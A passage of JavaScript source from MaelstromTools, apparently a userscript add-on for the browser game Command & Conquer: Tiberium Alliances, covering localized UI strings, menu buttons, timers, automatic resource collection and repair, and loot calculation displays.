              this.Data["Tib/gain"] = ["Tib./Zuwachs", "Tib/melhoria", "Tib / gain", "Tib/KazanÃ§"][l]; 
              this.Data["Pow/gain"] = ["Strom/Zuwachs", "Potencia/melhoria", "Puissance / Gain", "GÃ¼Ã§/KazanÃ§"][l]; 
              this.Data["ETA"] = ["VerfÃ¼gbar in", "Tempo restante", "Temps restant", "Kalan Zaman"][l]; 
              this.Data["Upgrade"] = ["AufrÃ¼sten", "Upgrade", "Upgrade", "YÃ¼kselt"][l]; 
              this.Data["Powerplant"] = ["Kratfwerk", "Central de Energia", "Centrale", "GÃ¼Ã§ Santrali"][l]; 
              this.Data["Refinery"] = ["Raffinerie", "Refinaria", "Raffinerie", "Rafineri"][l]; 
              this.Data["Harvester"] = ["Sammler", "Harvester", "Collecteur", "BiÃ§erdÃ¶ver"][l]; 
              this.Data["Silo"] = ["Silo", "Silo", "Silo", "Silo"][l]; 
              this.Data["Accumulator"] = ["Akkumulator", "Acumulador", "Accumulateur", "AkÃ¼mÃ¼latÃ¶r"][l]; 
              this.Data["Calibrate support"] = ["Artillerie kalibrieren", "Calibrar apoio", "Calibrer soutien", "Takviyeyi kalibre et"][l]; 
              this.Data["Access"] = ["Ã–ffne", "Aceder", "AccÃ¨s ", "AÃ§"][l]; 
              this.Data["Focus on"] = ["Zentriere auf", "Concentrar em", "CentrÃ© sur", "Odaklan"][l]; 
              this.Data["Possible attacks from this base (available CP)"] = ["MÃ¶gliche Angriffe (verfÃ¼gbare KP)", "Possible attacks from this base (available CP)","Possible attacks from this base (available CP)", "Bu Ã¼sten yapÄ±lmasÄ± mÃ¼mkÃ¼n olan saldÄ±rÄ±lar (mevcut KP)"][l]; 
              //this.Data[""] = [""][l]; 
            }, 
            get: function (ident) { 
              return this.gt(ident); 
            }, 
            gt: function (ident) { 
              if (!this.Data || !this.Data[ident]) { 
                /*if(!parseInt(ident.substr(0, 1), 10) && ident != "0") { 
                  console.log("missing language data: " + ident); 
                }*/ 
                return ident; 
              } 
              return this.Data[ident]; 
            } 
          } 
        }), 
 
        // define Base 
        qx.Class.define("MaelstromTools.Base", { 
          type: "singleton", 
          extend: qx.core.Object, 
          members: { 
            /* Desktop */ 
            timerInterval: 1500, 
            mainTimerInterval: 5000, 
            lootStatusInfoInterval: null, 
            images: null, 
            mWindows: null, 
            mainMenuWindow: null, 
 
            itemsOnDesktop: null, 
            itemsOnDesktopCount: null, 
            itemsInMainMenu: null, 
            itemsInMainMenuCount: null, 
            buttonCollectAllResources: null, 
            buttonRepairAllUnits: null, 
            buttonRepairAllBuildings: null, 
 
            lootWidget: null, 
 
            initialize: function () { 
              try { 
                //console.log(qx.locale.Manager.getInstance().getLocale()); 
                Lang.loadData(qx.locale.Manager.getInstance().getLocale()); 
                //console.log("Client version: " + MaelstromTools.Wrapper.GetClientVersion()); 
                this.itemsOnDesktopCount = new Array(); 
                this.itemsOnDesktop = new Object(); 
                this.itemsInMainMenuCount = new Array(); 
                this.itemsInMainMenu = new Object(); 
 
                var fileManager = ClientLib.File.FileManager.GetInstance(); 
                //ui/icons/icon_mainui_defense_button 
                //ui/icons/icon_mainui_base_button 
                //ui/icons/icon_army_points 
                //icon_def_army_points 
                var factionText = ClientLib.Base.Util.GetFactionGuiPatchText(); 
                this.createNewImage(MaelstromTools.Statics.Tiberium, "ui/common/icn_res_tiberium.png", fileManager); 
                this.createNewImage(MaelstromTools.Statics.Crystal, "ui/common/icn_res_chrystal.png", fileManager); 
                this.createNewImage(MaelstromTools.Statics.Power, "ui/common/icn_res_power.png", fileManager); 
                this.createNewImage(MaelstromTools.Statics.Dollar, "ui/common/icn_res_dollar.png", fileManager); 
                this.createNewImage(MaelstromTools.Statics.Research, "ui/common/icn_res_research.png", fileManager); 
                this.createNewImage("Sum", "ui/common/icn_build_slots.png", fileManager); 
                this.createNewImage("AccessBase", "ui/" + factionText + "/icons/icon_mainui_enterbase.png", fileManager); 
                this.createNewImage("FocusBase", "ui/" + factionText + "/icons/icon_mainui_focusbase.png", fileManager); 
                this.createNewImage("Packages", "ui/" + factionText + "/icons/icon_collect_packages.png", fileManager); 
                this.createNewImage("RepairAllUnits", "ui/" + factionText + "/icons/icon_army_points.png", fileManager); 
                this.createNewImage("RepairAllBuildings", "ui/" + factionText + "/icons/icn_build_slots.png", fileManager); 
                this.createNewImage("ResourceOverviewMenu", "ui/common/icn_res_chrystal.png", fileManager); 
                this.createNewImage("ProductionMenu", "ui/" + factionText + "/icons/icn_build_slots.png", fileManager); 
                this.createNewImage("RepairTimeMenu", "ui/" + factionText + "/icons/icon_repair_all_button.png", fileManager); 
                this.createNewImage("Crosshair", "ui/icons/icon_support_tnk_white.png", fileManager); 
                this.createNewImage("UpgradeBuilding", "ui/" + factionText + "/icons/icon_building_detail_upgrade.png", fileManager); 
 
                this.createNewWindow("MainMenu", "R", 125, 140, 120, 100, "B"); 
                this.createNewWindow("Production", "L", 120, 60, 340, 140); 
                this.createNewWindow("RepairTime", "L", 120, 60, 340, 140); 
                this.createNewWindow("ResourceOverview", "L", 120, 60, 340, 140); 
                this.createNewWindow("BaseStatusOverview", "L", 120, 60, 340, 140); 
                this.createNewWindow("Preferences", "L", 120, 60, 440, 140); 
                this.createNewWindow("UpgradePriority", "L", 120, 60, 870, 400); 
 
                if (!this.mainMenuWindow) { 
                  this.mainMenuWindow = new qx.ui.popup.Popup(new qx.ui.layout.Canvas()).set({ 
                    //backgroundColor: "#303030", 
                    padding: 5, 
                    paddingRight: 0 
                  }); 
                  if (MT_Preferences.Settings.useDedicatedMainMenu) { 
                    this.mainMenuWindow.setPlaceMethod("mouse"); 
                    this.mainMenuWindow.setPosition("top-left"); 
                  } else { 
                    this.mainMenuWindow.setPlaceMethod("widget"); 
                    this.mainMenuWindow.setPosition("bottom-right"); 
                    this.mainMenuWindow.setAutoHide(false); 
                    this.mainMenuWindow.setBackgroundColor("transparent"); 
                    this.mainMenuWindow.setShadow(null); 
                    this.mainMenuWindow.setDecorator(new qx.ui.decoration.Background()); 
                  } 
                } 
 
                var desktopPositionModifier = 0; 
 
                this.buttonCollectAllResources = this.createDesktopButton(Lang.gt("Collect all packages"), "Packages", true, this.desktopPosition(desktopPositionModifier)); 
                this.buttonCollectAllResources.addListener("execute", this.collectAllPackages, this); 
 
                var openProductionWindowButton = this.createDesktopButton(Lang.gt("Overall production"), "ProductionMenu", false, this.desktopPosition(desktopPositionModifier)); 
                openProductionWindowButton.addListener("execute", function () { 
                  window.MaelstromTools.Production.getInstance().openWindow("Production", Lang.gt("Overall production")); 
                }, this); 
 
                var openResourceOverviewWindowButton = this.createDesktopButton(Lang.gt("Base resources"), "ResourceOverviewMenu", false, this.desktopPosition(desktopPositionModifier)); 
                openResourceOverviewWindowButton.addListener("execute", function () { 
                  window.MaelstromTools.ResourceOverview.getInstance().openWindow("ResourceOverview", Lang.gt("Base resources")); 
                }, this); 
 
                desktopPositionModifier++; 
                var openMainMenuButton = this.createDesktopButton(Lang.gt("Main menu"), "ProductionMenu", false, this.desktopPosition(desktopPositionModifier)); 
                openMainMenuButton.addListener("click", function (e) { 
                  this.mainMenuWindow.placeToMouse(e); 
                  this.mainMenuWindow.show(); 
                }, this); 
 
                this.buttonRepairAllUnits = this.createDesktopButton(Lang.gt("Repair all units"), "RepairAllUnits", true, this.desktopPosition(desktopPositionModifier)); 
                this.buttonRepairAllUnits.addListener("execute", this.repairAllUnits, this); 
 
                this.buttonRepairAllBuildings = this.createDesktopButton(Lang.gt("Repair all buildings"), "RepairAllBuildings", true, this.desktopPosition(desktopPositionModifier)); 
                this.buttonRepairAllBuildings.addListener("execute", this.repairAllBuildings, this); 
 
                var openRepairTimeWindowButton = this.createDesktopButton(Lang.gt("Army overview"), "RepairTimeMenu", false, this.desktopPosition(desktopPositionModifier)); 
                openRepairTimeWindowButton.addListener("execute", function () { 
                  window.MaelstromTools.RepairTime.getInstance().openWindow("RepairTime", Lang.gt("Army overview")); 
                }, this); 
 
                var openBaseStatusOverview = this.createDesktopButton(Lang.gt("Base status overview"), "Crosshair", false, this.desktopPosition(desktopPositionModifier)); 
                openBaseStatusOverview.addListener("execute", function () { 
                  window.MaelstromTools.BaseStatus.getInstance().openWindow("BaseStatusOverview", Lang.gt("Base status overview")); 
                }, this); 
 
                desktopPositionModifier++; 
                var openHuffyUpgradeOverview = this.createDesktopButton(Lang.gt("Upgrade priority overview"), "UpgradeBuilding", false, this.desktopPosition(desktopPositionModifier)); 
                openHuffyUpgradeOverview.addListener("execute", function () { 
                  window.HuffyTools.UpgradePriorityGUI.getInstance().openWindow("UpgradePriority", Lang.gt("Upgrade priority overview")); 
                }, this); 
 
                desktopPositionModifier++; 
                var preferencesButton = new qx.ui.form.Button(Lang.gt("Options")).set({ 
                  appearance: "button-text-small", 
                  width: 100, 
                  minWidth: 100, 
                  maxWidth: 100 
                }); 
                preferencesButton.setUserData("desktopPosition", this.desktopPosition(desktopPositionModifier)); 
                preferencesButton.addListener("execute", function () { 
                  window.MaelstromTools.Preferences.getInstance().openWindow("Preferences", Lang.gt("MaelstromTools Preferences"), true); 
                }, this); 
 
                if (MT_Preferences.Settings.useDedicatedMainMenu) { 
                  this.addToDesktop("MainMenu", openMainMenuButton); 
                } 
                this.addToMainMenu("ResourceOverviewMenu", openResourceOverviewWindowButton); 
                this.addToMainMenu("ProductionMenu", openProductionWindowButton); 
                this.addToMainMenu("BaseStatusMenu", openBaseStatusOverview); 
                this.addToMainMenu("RepairTimeMenu", openRepairTimeWindowButton); 
                this.addToMainMenu("UpgradeBuilding", openHuffyUpgradeOverview); 
 
                this.addToMainMenu("PreferencesMenu", preferencesButton); 
 
                if (!MT_Preferences.Settings.useDedicatedMainMenu) { 
                  this.mainMenuWindow.show(); 
                  var target = qx.core.Init.getApplication().getOptionsBar(); //getServerBar(); //qx.core.Init.getApplication().getUIItem(ClientLib.Data.Missions.PATH.BAR_APPOINTMENTS); 
                  this.mainMenuWindow.placeToWidget(target, true); 
                } 
 
                webfrontend.gui.chat.ChatWidget.recvbufsize = MaelstromTools.LocalStorage.get(MaelstromTools.Preferences.CHATHISTORYLENGTH, 64); 
                this.runSecondlyTimer(); 
                this.runMainTimer(); 
                this.runAutoCollectTimer(); 
              } catch (e) { 
                console.log("MaelstromTools.initialize: ", e); 
              } 
            }, 
 
            desktopPosition: function (modifier) { 
              if (!modifier) modifier = 0; 
              return modifier; 
            }, 
 
            createDesktopButton: function (title, imageName, isNotification, desktopPosition) { 
              try { 
                if (!isNotification) { 
                  isNotification = false; 
                } 
                if (!desktopPosition) { 
                  desktopPosition = this.desktopPosition(); 
                } 
                var desktopButton = new qx.ui.form.Button(null, this.images[imageName]).set({ 
                  toolTipText: title, 
                  width: 50, 
                  height: 40, 
                  maxWidth: 50, 
                  maxHeight: 40, 
                  appearance: (isNotification ? "button-standard-nod" : "button-playarea-mode-frame"), //"button-standard-"+factionText), button-playarea-mode-red-frame 
                  center: true 
                }); 
 
                desktopButton.setUserData("isNotification", isNotification); 
                desktopButton.setUserData("desktopPosition", desktopPosition); 
                return desktopButton; 
              } catch (e) { 
                console.log("MaelstromTools.createDesktopButton: ", e); 
              } 
            }, 
 
            createNewImage: function (name, path, fileManager) { 
              try { 
                if (!this.images) { 
                  this.images = new Object(); 
                } 
                if (!fileManager) { 
                  return; 
                } 
 
                this.images[name] = fileManager.GetPhysicalPath(path); 
              } catch (e) { 
                console.log("MaelstromTools.createNewImage: ", e); 
              } 
            }, 
 
            createNewWindow: function (name, align, x, y, w, h, alignV) { 
              try { 
                if (!this.mWindows) { 
                  this.mWindows = new Object(); 
                } 
                this.mWindows[name] = new Object(); 
                this.mWindows[name]["Align"] = align; 
                this.mWindows[name]["AlignV"] = alignV; 
                this.mWindows[name]["x"] = x; 
                this.mWindows[name]["y"] = y; 
                this.mWindows[name]["w"] = w; 
                this.mWindows[name]["h"] = h; 
              } catch (e) { 
                console.log("MaelstromTools.createNewWindow: ", e); 
              } 
            }, 
 
            addToMainMenu: function (name, button) { 
              try { 
                /*if(!this.useDedicatedMainMenu) { 
                  return; 
                }*/ 
                if (this.itemsInMainMenu[name] != null) { 
                  return; 
                } 
                var desktopPosition = button.getUserData("desktopPosition"); 
                var isNotification = button.getUserData("isNotification"); 
                if (!desktopPosition) { 
                  desktopPosition = this.desktopPosition(); 
                } 
                if (!isNotification) { 
                  isNotification = false; 
                } 
 
                if (isNotification && MT_Preferences.Settings.useDedicatedMainMenu) { 
                  this.addToDesktop(name, button); 
                } else { 
                  if (!this.itemsInMainMenuCount[desktopPosition]) { 
                    this.itemsInMainMenuCount[desktopPosition] = 0; 
                  } 
                  this.mainMenuWindow.add(button, { 
                    right: 5 + (52 * this.itemsInMainMenuCount[desktopPosition]), 
                    top: 0 + (42 * (desktopPosition)) //bottom: 0 - (42 * (desktopPosition - 1)) 
                  }); 
 
                  this.itemsInMainMenu[name] = button; 
                  this.itemsInMainMenuCount[desktopPosition]++; 
                } 
              } catch (e) { 
                console.log("MaelstromTools.addToMainMenu: ", e); 
              } 
            }, 
 
            removeFromMainMenu: function (name, rearrange) { 
              try { 
                if (rearrange == null) { 
                  rearrange = true; 
                } 
                if (this.itemsOnDesktop[name] != null) { 
                  var isNotification = this.itemsOnDesktop[name].getUserData("isNotification"); 
                  if (!isNotification) { 
                    isNotification = false; 
                  } 
                  if (isNotification && MT_Preferences.Settings.useDedicatedMainMenu) { 
                    this.removeFromDesktop(name, rearrange); 
                  } 
                } else if (this.itemsInMainMenu[name] != null) { 
                  var desktopPosition = this.itemsInMainMenu[name].getUserData("desktopPosition"); 
                  var isNotification = this.itemsInMainMenu[name].getUserData("isNotification"); 
                  if (!desktopPosition) { 
                    desktopPosition = this.desktopPosition(); 
                  } 
                  if (!isNotification) { 
                    isNotification = false; 
                  } 
 
                  this.mainMenuWindow.remove(this.itemsInMainMenu[name]); 
                  this.itemsInMainMenu[name] = null; 
                  this.itemsInMainMenuCount[desktopPosition]--; 
 
                  if (rearrange && this.itemsInMainMenu[desktopPosition] > 1) { 
                    var tmpItems = new Object(); 
                    // remove notifications  
                    for (var itemName in this.itemsOnDesktop) { 
                      if (this.itemsInMainMenu[itemName] == null) { 
                        continue; 
                      } 
                      if (!isNotification) { 
                        continue; 
                      } 
                      tmpItems[itemName] = this.itemsInMainMenu[itemName]; 
                      this.removeFromMainMenu(itemName, false); 
                    } 
                    // rearrange notifications 
                    for (var itemName2 in tmpItems) { 
                      var tmp = tmpItems[itemName2]; 
                      if (tmp == null) { 
                        continue; 
                      } 
                      this.addToMainMenu(itemName2, tmp); 
                    } 
                  } 
                } 
              } catch (e) { 
                console.log("MaelstromTools.removeFromDesktop: ", e); 
              } 
            }, 
 
            addToDesktop: function (name, button) { 
              try { 
                if (this.itemsOnDesktop[name] != null) { 
                  return; 
                } 
                var desktopPosition = button.getUserData("desktopPosition"); 
                if (!desktopPosition) { 
                  desktopPosition = this.desktopPosition(); 
                } 
 
                if (!this.itemsOnDesktopCount[desktopPosition]) { 
                  this.itemsOnDesktopCount[desktopPosition] = 0; 
                } 
 
                var app = qx.core.Init.getApplication(); 
                //var navBar = app.getNavigationBar(); 
 
                // console.log("add to Desktop at pos: " + this.itemsOnDesktopCount); 
                app.getDesktop().add(button, { 
                  //right: navBar.getBounds().width + (52 * this.itemsOnDesktopCount[desktopPosition]), 
                  //top: 42 * (desktopPosition - 1) 
                  right: 5 + (52 * this.itemsOnDesktopCount[desktopPosition]), 
                  //top: this.initialAppointmentBarHeight + 125 + (42 * (desktopPosition - 1)) 
                  bottom: 140 - (42 * (desktopPosition - 1)) 
                }); 
 
                this.itemsOnDesktop[name] = button; 
                this.itemsOnDesktopCount[desktopPosition]++; 
              } catch (e) { 
                console.log("MaelstromTools.addToDesktop: ", e); 
              } 
            }, 
 
            removeFromDesktop: function (name, rearrange) { 
              try { 
                if (rearrange == null) { 
                  rearrange = true; 
                } 
                var app = qx.core.Init.getApplication(); 
 
                if (this.itemsOnDesktop[name] != null) { 
                  var desktopPosition = this.itemsOnDesktop[name].getUserData("desktopPosition"); 
                  var isNotification = this.itemsOnDesktop[name].getUserData("isNotification"); 
                  if (!desktopPosition) { 
                    desktopPosition = this.desktopPosition(); 
                  } 
                  if (!isNotification) { 
                    isNotification = false; 
                  } 
 
                  app.getDesktop().remove(this.itemsOnDesktop[name]); 
                  this.itemsOnDesktop[name] = null; 
                  this.itemsOnDesktopCount[desktopPosition]--; 
 
                  if (rearrange && this.itemsOnDesktopCount[desktopPosition] > 1) { 
                    var tmpItems = new Object(); 
                    // remove notifications  
                    for (var itemName in this.itemsOnDesktop) { 
                      if (this.itemsOnDesktop[itemName] == null) { 
                        continue; 
                      } 
                      if (!this.itemsOnDesktop[itemName].getUserData("isNotification")) { 
                        continue; 
                      } 
                      tmpItems[itemName] = this.itemsOnDesktop[itemName]; 
                      this.removeFromDesktop(itemName, false); 
                    } 
                    // rearrange notifications 
                    for (var itemName2 in tmpItems) { 
                      var tmp = tmpItems[itemName2]; 
                      if (tmp == null) { 
                        continue; 
                      } 
                      this.addToMainMenu(itemName2, tmp); 
                    } 
                  } 
                } 
              } catch (e) { 
                console.log("MaelstromTools.removeFromDesktop: ", e); 
              } 
            }, 
 
            runSecondlyTimer: function () { 
              try { 
                this.calculateCostsForNextMCV(); 
 
                var self = this; 
                window.setTimeout(function () { 
                  self.runSecondlyTimer(); 
                }, 1000); 
              } catch (e) { 
                console.log("MaelstromTools.runSecondlyTimer: ", e); 
              } 
            }, 
 
            runMainTimer: function () { 
              try { 
                this.checkForPackages(); 
                if (CCTAWrapperIsInstalled()) { 
                  this.checkRepairAllUnits(); 
                  this.checkRepairAllBuildings(); 
                } 
 
                var missionTracker = typeof (qx.core.Init.getApplication().getMissionsBar) === 'function' ? qx.core.Init.getApplication().getMissionsBar() : qx.core.Init.getApplication().getMissionTracker(); //fix for PerforceChangelist>=376877 
                if (MT_Preferences.Settings.autoHideMissionTracker) { 
                  if (missionTracker.isVisible()) { 
                    missionTracker.hide(); 
                  } 
                  if (typeof (qx.core.Init.getApplication().getMissionsBar) === 'function') { 
                    if (qx.core.Init.getApplication().getMissionsBar().getSizeHint().height != 0) { 
                      qx.core.Init.getApplication().getMissionsBar().getSizeHint().height = 0; 
                      qx.core.Init.getApplication().triggerDesktopResize(); 
                    } 
                  } 
                } else { 
                  if (!missionTracker.isVisible()) { 
                    missionTracker.show(); 
                    if (typeof (qx.core.Init.getApplication().getMissionsBar) === 'function') { 
                      qx.core.Init.getApplication().getMissionsBar().initHeight(); 
                      qx.core.Init.getApplication().triggerDesktopResize(); 
                    } 
                  } 
                } 
                 
                var self = this; 
                window.setTimeout(function () { 
                  self.runMainTimer(); 
                }, this.mainTimerInterval); 
              } catch (e) { 
                console.log("MaelstromTools.runMainTimer: ", e); 
              } 
            }, 
 
            runAutoCollectTimer: function () { 
              try { 
                //console.log("runAutoCollectTimer ", MT_Preferences.Settings.AutoCollectTimer); 
                if (!CCTAWrapperIsInstalled()) return; // run timer only then wrapper is running 
                if (this.checkForPackages() && MT_Preferences.Settings.autoCollectPackages) { 
                  this.collectAllPackages(); 
                } 
                if (this.checkRepairAllUnits() && MT_Preferences.Settings.autoRepairUnits) { 
                  this.repairAllUnits(); 
                } 
                if (this.checkRepairAllBuildings() && MT_Preferences.Settings.autoRepairBuildings) { 
                  this.repairAllBuildings(); 
                } 
 
                var self = this; 
                window.setTimeout(function () { 
                  self.runAutoCollectTimer(); 
                }, MT_Preferences.Settings.AutoCollectTimer * 60000); 
              } catch (e) { 
                console.log("MaelstromTools.runMainTimer: ", e); 
              } 
            }, 
 
            openWindow: function (windowObj, windowName, skipMoveWindow) { 
              try { 
                if (!windowObj.isVisible()) { 
                  if (windowName == "MainMenu") { 
                    windowObj.show(); 
                  } else { 
                    if (!skipMoveWindow) { 
                      this.moveWindow(windowObj, windowName); 
                    } 
                    windowObj.open(); 
                  } 
                } 
              } catch (e) { 
                console.log("MaelstromTools.openWindow: ", e); 
              } 
            }, 
 
            moveWindow: function (windowObj, windowName) { 
              try { 
                var x = this.mWindows[windowName]["x"]; 
                var y = this.mWindows[windowName]["y"]; 
                if (this.mWindows[windowName]["Align"] == "R") { 
                  x = qx.bom.Viewport.getWidth(window) - this.mWindows[windowName]["x"]; 
                } 
                if (this.mWindows[windowName]["AlignV"] == "B") { 
                  y = qx.bom.Viewport.getHeight(window) - this.mWindows[windowName]["y"] - windowObj.height; 
                } 
                windowObj.moveTo(x, y); 
                if (windowName != "MainMenu") { 
                  windowObj.setHeight(this.mWindows[windowName]["h"]); 
                  windowObj.setWidth(this.mWindows[windowName]["w"]); 
                } 
              } catch (e) { 
                console.log("MaelstromTools.moveWindow: ", e); 
              } 
            }, 
 
            checkForPackages: function () { 
              try { 
                MT_Cache.updateCityCache(); 
 
                for (var cname in MT_Cache.Cities) { 
                  var ncity = MT_Cache.Cities[cname].Object; 
                  if (ncity.get_CityBuildingsData().get_HasCollectableBuildings()) { 
                    this.addToMainMenu("CollectAllResources", this.buttonCollectAllResources); 
                    return true; 
                  } 
                } 
                this.removeFromMainMenu("CollectAllResources"); 
                return false; 
              } catch (e) { 
                console.log("MaelstromTools.checkForPackages: ", e); 
                return false; 
              } 
            }, 
 
            collectAllPackages: function () { 
              try { 
                MT_Cache.updateCityCache(); 
                for (var cname in MT_Cache.Cities) { 
                  var ncity = MT_Cache.Cities[cname].Object; 
                  if (ncity.get_CityBuildingsData().get_HasCollectableBuildings()) { 
                    if (MT_Cache.CityCount <= 1) { 
                      var buildings = ncity.get_Buildings().d; 
                      for (var x in buildings) { 
                        var building = buildings[x]; 
                        if (building.get_ProducesPackages() && building.get_ReadyToCollect()) { 
                          ClientLib.Net.CommunicationManager.GetInstance().SendCommand("CollectResource",{cityid:ncity.get_Id(), posX:building.get_CoordX(),posY:building.get_CoordY()}, null, null, true); 
                        } 
                      } 
                    } else { 
                      ncity.CollectAllResources(); 
                    } 
                  } 
                } 
                this.removeFromMainMenu("CollectAllResources"); 
              } catch (e) { 
                console.log("MaelstromTools.collectAllPackages: ", e); 
              } 
            }, 
 
            checkRepairAll: function (visMode, buttonName, button) { 
              try { 
                MT_Cache.updateCityCache(); 
 
                for (var cname in MT_Cache.Cities) { 
                  var ncity = MT_Cache.Cities[cname].Object; 
                  if (MaelstromTools.Wrapper.CanRepairAll(ncity, visMode)) { 
                    this.addToMainMenu(buttonName, button); 
                    return true; 
                  } 
                } 
 
                this.removeFromMainMenu(buttonName); 
                return false; 
              } catch (e) { 
                console.log("MaelstromTools.checkRepairAll: ", e); 
                return false; 
              } 
            }, 
 
            checkRepairAllUnits: function () { 
              return this.checkRepairAll(ClientLib.Vis.Mode.ArmySetup, "RepairAllUnits", this.buttonRepairAllUnits); 
            }, 
 
            checkRepairAllBuildings: function () { 
              return this.checkRepairAll(ClientLib.Vis.Mode.City, "RepairAllBuildings", this.buttonRepairAllBuildings); 
            }, 
 
            repairAll: function (visMode, buttonName) { 
              try { 
                MT_Cache.updateCityCache(); 
 
                for (var cname in MT_Cache.Cities) { 
                  var ncity = MT_Cache.Cities[cname].Object; 
                  if (MaelstromTools.Wrapper.CanRepairAll(ncity, visMode)) { 
                    MaelstromTools.Wrapper.RepairAll(ncity, visMode); 
                  } 
 
                } 
                this.removeFromMainMenu(buttonName); 
              } catch (e) { 
                console.log("MaelstromTools.repairAll: ", e); 
              } 
            }, 
 
            //ClientLib.Data.City.prototype.get_CityRepairData 
            //ClientLib.Data.CityRepair.prototype.CanRepairAll 
            //ClientLib.Data.CityRepair.prototype.RepairAll 
            repairAllUnits: function () { 
              try { 
                this.repairAll(ClientLib.Vis.Mode.ArmySetup, "RepairAllUnits"); 
              } catch (e) { 
                console.log("MaelstromTools.repairAllUnits: ", e); 
              } 
            }, 
 
            repairAllBuildings: function () { 
              try { 
                this.repairAll(ClientLib.Vis.Mode.City, "RepairAllBuildings"); 
              } catch (e) { 
                console.log("MaelstromTools.repairAllBuildings: ", e); 
              } 
            }, 
 
            updateLoot: function (ident, visCity, widget) { 
              try { 
                clearInterval(this.lootStatusInfoInterval); 
                if (!MT_Preferences.Settings.showLoot) { 
                  if (this.lootWidget[ident]) { 
                    this.lootWidget[ident].removeAll(); 
                  } 
                  return; 
                } 
 
                var baseLoadState = MT_Cache.updateLoot(visCity); 
                if (baseLoadState == -2) { // base already cached and base not changed 
                  return; 
                } 
 
                if (!this.lootWidget) { 
                  this.lootWidget = new Object(); 
                } 
                if (!this.lootWidget[ident]) { 
                  this.lootWidget[ident] = new qx.ui.container.Composite(new qx.ui.layout.Grid(5, 5)); 
                  this.lootWidget[ident].setTextColor("white"); 
                  widget.add(this.lootWidget[ident]); 
                } 
                var lootWidget = this.lootWidget[ident]; 
 
                var rowIdx = 1; 
                var colIdx = 1; 
                lootWidget.removeAll(); 
                switch (baseLoadState) { 
                  case -1: 
                    { 
                      MaelstromTools.Util.addLabel(lootWidget, rowIdx, colIdx++, "Target out of range, no resource calculation possible", null, null, 'bold', null); 
                      break; 
                    } 
                  case 1: 
                    { 
                      var Resources = MT_Cache.SelectedBaseResources; 
                      this.createResourceLabels(lootWidget, ++rowIdx, "Possible attacks from this base (available CP)", Resources, - 1); 
                      this.createResourceLabels(lootWidget, ++rowIdx, "Lootable resources", Resources, 1); 
                      this.createResourceLabels(lootWidget, ++rowIdx, "per CP", Resources, 1 * Resources.CPNeeded); 
                      this.createResourceLabels(lootWidget, ++rowIdx, "2nd run", Resources, 2 * Resources.CPNeeded); 
                      this.createResourceLabels(lootWidget, ++rowIdx, "3rd run", Resources, 3 * Resources.CPNeeded); 
                      break; 
                    } 
                  default: 
                    { 
                      MaelstromTools.Util.addLabel(lootWidget, rowIdx, colIdx++, "Calculating resources...", null, null, 'bold', null); 
                      this.lootStatusInfoInterval = setInterval(function () { 
                        MaelstromTools.Base.getInstance().updateLoot(ident, visCity, widget); 
                      }, 100); 
                      break; 
                    } 
                } 
              } catch (e) { 
                console.log("MaelstromTools.updateLoot: ", e); 
              } 
            }, 
 
            createResourceLabels: function (lootWidget, rowIdx, Label, Resources, Modifier) { 
              var colIdx = 1; 
              var font = (Modifier > 1 ? null : 'bold'); 
 
              if (Modifier == -1 && Resources.CPNeeded > 0) { 
                Label = Lang.gt(Label) + ": " + Math.floor(ClientLib.Data.MainData.GetInstance().get_Player().GetCommandPointCount() / Resources.CPNeeded); 
                MaelstromTools.Util.addLabel(lootWidget, rowIdx, colIdx++, Label, null, 'left', font, null, 9); 
                return; 
              } 
              colIdx = 1; 
              if (Modifier > 0) { 
                MaelstromTools.Util.addLabel(lootWidget, rowIdx, colIdx++, Lang.gt(Label) + ":", null, null, font); 
                MaelstromTools.Util.addImage(lootWidget, rowIdx, colIdx++, MaelstromTools.Util.getImage(MaelstromTools.Statics.Research)); 
                MaelstromTools.Util.addLabel(lootWidget, rowIdx, colIdx++, MaelstromTools.Wrapper.FormatNumbersCompact(Resources[MaelstromTools.Statics.Research] / Modifier), 50, 'right', font); 
                MaelstromTools.Util.addImage(lootWidget, rowIdx, colIdx++, MaelstromTools.Util.getImage(MaelstromTools.Statics.Tiberium)); 
                MaelstromTools.Util.addLabel(lootWidget, rowIdx, colIdx++, MaelstromTools.Wrapper.FormatNumbersCompact(Resources[MaelstromTools.Statics.Tiberium] / Modifier), 50, 'right', font); 
                MaelstromTools.Util.addImage(lootWidget, rowIdx, colIdx++, MaelstromTools.Util.getImage(MaelstromTools.Statics.Crystal)); 
                MaelstromTools.Util.addLabel(lootWidget, rowIdx, colIdx++, MaelstromTools.Wrapper.FormatNumbersCompact(Resources[MaelstromTools.Statics.Crystal] / Modifier), 50, 'right', font); 
                MaelstromTools.Util.addImage(lootWidget, rowIdx, colIdx++, MaelstromTools.Util.getImage(MaelstromTools.Statics.Dollar)); 
                MaelstromTools.Util.addLabel(lootWidget, rowIdx, colIdx++, MaelstromTools.Wrapper.FormatNumbersCompact(Resources[MaelstromTools.Statics.Dollar] / Modifier), 50, 'right', font); 
                MaelstromTools.Util.addImage(lootWidget, rowIdx, colIdx++, MaelstromTools.Util.getImage("Sum")); 
                MaelstromTools.Util.addLabel(lootWidget, rowIdx, colIdx++, MaelstromTools.Wrapper.FormatNumbersCompact(Resources["Total"] / Modifier), 50, 'right', font); 
              } 
            }, 
 
            mcvPopup: null, 
            mcvPopupX : 0, 
            mcvPopupY : 0, 
            mcvTimerLabel: null, 
            calculateCostsForNextMCV: function () { 
              try { 
                if (!MT_Preferences.Settings.showCostsForNextMCV) { 
                  if (this.mcvPopup) { 
                    this.mcvPopup.close(); 
                  } 
                  return; 
                } 
                var player = ClientLib.Data.MainData.GetInstance().get_Player(); 
                var cw = player.get_Faction(); 
                var cj = ClientLib.Base.Tech.GetTechIdFromTechNameAndFaction(ClientLib.Base.ETechName.Research_BaseFound, cw); 
                var cr = player.get_PlayerResearch(); 
                var cd = cr.GetResearchItemFomMdbId(cj); 
                if (cd == null) { 
                  if (this.mcvPopup) { 
                    this.mcvPopup.close(); 
                  } 
                  return; 
                } 
 
                if (!this.mcvPopup) { 
                  this.mcvPopup = new qx.ui.window.Window("").set({ 
                    contentPadding : 0, 
                    showMinimize : false, 
                    showMaximize : false, 
                    showClose : false, 
                    resizable : false 
                  }); 
                  this.mcvPopup.setLayout(new qx.ui.layout.VBox()); 
                  this.mcvPopup.addListener("move", function (e) { 
                    var base = MaelstromTools.Base.getInstance(); 
                    var size = qx.core.Init.getApplication().getRoot().getBounds(); 
                    var value = size.width - e.getData().left; 
                    base.mcvPopupX = value < 0 ? 150 : value; 
                    value = size.height - e.getData().top; 
                    base.mcvPopupY = value < 0 ? 70 : value; 
                    MaelstromTools.LocalStorage.set("mcvPopup", { 
                      x : base.mcvPopupX, 
